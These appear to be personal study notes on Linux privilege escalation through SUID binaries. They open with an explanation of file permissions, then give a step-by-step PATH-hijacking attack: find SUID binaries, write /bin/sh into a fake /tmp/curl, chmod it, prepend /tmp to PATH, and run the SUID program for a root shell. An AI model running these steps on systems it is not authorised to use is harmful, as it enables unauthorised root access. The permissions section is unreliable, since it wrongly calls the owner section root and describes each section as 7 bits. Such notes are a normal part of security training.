Abusing SUID

**Permissions Basics**

Permissions on folders and files are broken up into 4 categories when viewing a listing “ls -la”.

example of the sections broken apart:
- rwx rwx rwx (file,read write execute,read write execute,read write execute)

example of what may be seen in an actual listing:
-rwxr-xr-- (file,read write execute,read execute, read)

The first section indicates if it is a file or a directory “-” or "d".
The second section indicates root privileges “rwx” or Read, Write, Execute
The third section indicates group privileges “rwx” or Read, Write, Execute
The fourth section indicates all other user privileges “rwx” or Read, Write, Execute

Each section is broken into 7 bits.

The first counter (read) is worth 4 bits
The second counter (write) is worth 2 bits
The third counter (execute) is worth 1 bits

ex. “chmod 777 file.sh” gives rwx for all 3 sections of the file permissions

Locating files with SUID Bits

~~~bash
find / -perm -u=s -type f 2> /dev/null
~~~

After locating files/binaries with the SUID Bit enabled, search GTFOBins for additional/potential escalation points

**SUID Binary Copy and Path Replacement**

This can be useful if you find a binary/script that has root privs that is calling other applications (i.e curl, ifconfig, uname)

Start with locating suid bit binaries/scripts

~~~bash
find / -perm -u=s -type f 2> /dev/null
~~~

ex. /usr/bin/menu

When you run manual, you notice that the outputs for each option give you outputs from other binaries (like in the example above).

Echo /bin/sh into a file and name it one of the binary names that is being called from the menu binary/script

~~~bash
echo /bin/sh > /tmp/curl
~~~

chmod the binary with RWX permissions

~~~bash
chmod 777 /tmp/curl
~~~

Add the binary as a $PATH environment variable

~~~bash
export PATH=/tmp:$PATH
~~~

Re-run the menu binary and select the option that has the binary that you just created the file for and you should now have a root shell

![[Pasted image 20230102132213.png]]
